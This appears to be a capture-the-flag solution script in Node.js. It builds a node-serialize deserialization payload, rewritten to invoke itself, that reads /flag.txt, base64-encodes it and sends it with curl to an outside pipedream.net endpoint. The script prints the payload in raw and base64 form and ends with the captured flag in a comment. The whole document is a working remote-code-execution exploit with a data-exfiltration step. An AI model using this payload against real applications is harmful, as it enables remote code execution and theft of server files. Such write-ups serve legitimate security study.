var serialize = require("node-serialize");

evil = {
  name: function () {
    var fs = require("fs");
    fs.readFile("/flag.txt", function (err, data) {
      let base64flag = Buffer.from(data).toString("base64");
      require("child_process").exec(
        "curl https://enghd2bd35t7sh5.m.pipedream.net?flag=" + base64flag
      );
    });
  },
  password: "hoge",
};

let buff = new Buffer.from(serialize.serialize(evil));

console.log("Evil Serialized:");
buff = buff.toString("ascii").replace('}","pass', '}()","pass');
console.log(buff + "\n\n");

console.log("Evil Base64");
let base64data = Buffer.from(buff).toString("base64");
console.log(base64data + "\n\n");

// zh3r0{4ll_y0u_h4d_t0_d0_w4s_m0v3_th3_0bjc3ts_3mper0r}
